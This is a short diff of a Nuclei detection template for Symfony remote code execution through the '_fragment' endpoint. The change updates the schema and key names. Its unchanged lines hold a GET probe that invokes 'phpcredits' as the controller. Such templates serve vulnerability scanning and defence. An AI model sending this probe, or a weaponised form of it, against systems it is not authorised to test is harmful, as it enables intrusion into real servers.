@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: rce-symfony
 info:
   name: symfony rce
@@ -7,7 +8,7 @@ info:
     - https://www.acunetix.com/vulnerabilities/web/symfony-rce-via-weak-predictable-app_secret
     - https://www.ambionics.io/blog/symfony-secret-fragment
   tags: rce
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/_fragment?_path=_controller=phpcredits&flag=-1"
